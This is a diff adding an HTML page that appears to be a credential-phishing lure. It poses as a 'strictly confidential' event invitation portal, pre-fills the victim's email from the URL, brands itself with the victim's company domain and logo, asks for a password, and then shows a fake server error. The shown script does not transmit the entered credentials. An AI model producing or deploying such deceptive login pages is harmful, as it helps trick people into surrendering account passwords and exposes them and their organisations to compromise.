@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login to Your Account</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      transition: background-image 0.5s ease;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(10px);
+      background-color: rgba(255, 255, 255, 0.2);
+      z-index: 0;
+    }
+
+    .login-container {
+      background-color: rgba(255, 255, 255, 0.65);
+      backdrop-filter: blur(20px);
+      width: 100%;
+      max-width: 360px;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      z-index: 1;
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .login-container h2 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #222;
+    }
+
+    .login-container p.subtext {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .login-container input {
+      width: 90%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      background-color: #f9f9f9;
+    }
+
+    .login-container input:focus {
+      border-color: #007BFF;
+      outline: none;
+      background-color: #fff;
+    }
+
+    .login-container button {
+      width: 90%;
+      padding: 12px;
+      background-color: #007BFF;
+      color: #fff;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-bottom: 10px;
+    }
+
+    .login-container button:hover {
+      background-color: #0056b3;
+    }
+
+    .login-container p.note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 5px;
+    }
+
+    #confirmation {
+      display: none;
+      background-color: rgba(40, 40, 40, 0.95);
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      border-radius: 8px;
+      border-top: 5px solid #007BFF;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1000;
+    }
+
+    #confirmation p {
+      color: #fff;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 14px;
+      color: #fff;
+      z-index: 1000;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Login Panel -->
+  <div id="login" class="login-container">
+    <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
+
+    <!-- Dynamic Title -->
+    <h2 id="portalTitle">Event Invitation Portal</h2>
+
+    <p class="subtext">Strictly Confidential</p>
+
+    <input type="text" id="username" placeholder="Email" required>
+    <input type="password" id="password" placeholder="Password" required>
+
+    <button onclick="authenticate()">Login</button>
+
+    <p class="note">
+      You have been added to this secure portal due to your invitation to a strictly confidential event.
+    </p>
+  </div>
+
+  <!-- Confirmation Message -->
+  <div id="confirmation">
+    <h2 style="color: white;">ERROR: Try Again</h2>
+    <p>An internal server error occurred. Please try again.</p>
+    <button onclick="window.close()">Close this page</button>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    2026 Email Invitation. All Rights Reserved
+  </div>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const params = new URLSearchParams(window.location.search);
+    const emailParam = params.get("email");
+
+    const usernameField = document.getElementById("username");
+    const title = document.getElementById("portalTitle");
+
+    function extractDomain(email) {
+      if (!email || !email.includes("@")) return "";
+      return email.split("@")[1];
+    }
+
+    function setBackgroundFromDomain(domain) {
+      if (!domain) return;
+
+      const logoUrl = `https://logo.clearbit.com/${domain}`;
+      document.body.style.backgroundImage = `url('${logoUrl}')`;
+      document.body.style.backgroundSize = "cover";
+      document.body.style.backgroundPosition = "center";
+    }
+
+    // ✅ Prefill + apply domain
+    if (emailParam && usernameField) {
+      const decodedEmail = decodeURIComponent(emailParam);
+      usernameField.value = decodedEmail;
+
+      const domain = extractDomain(decodedEmail);
+      if (domain) {
+        title.textContent = domain;
+        setBackgroundFromDomain(domain);
+      }
+    }
+
+    // ✅ Update live
+    usernameField.addEventListener("input", function () {
+      const domain = extractDomain(this.value.trim());
+
+      if (domain) {
+        title.textContent = domain;
+        setBackgroundFromDomain(domain);
+      } else {
+        title.textContent = "Event Invitation Portal";
+      }
+    });
+  });
+
+  function authenticate() {
+    document.getElementById("login").style.display = "none";
+    document.getElementById("confirmation").style.display = "block";
+  }
+</script>
+
+</body>
+</html>
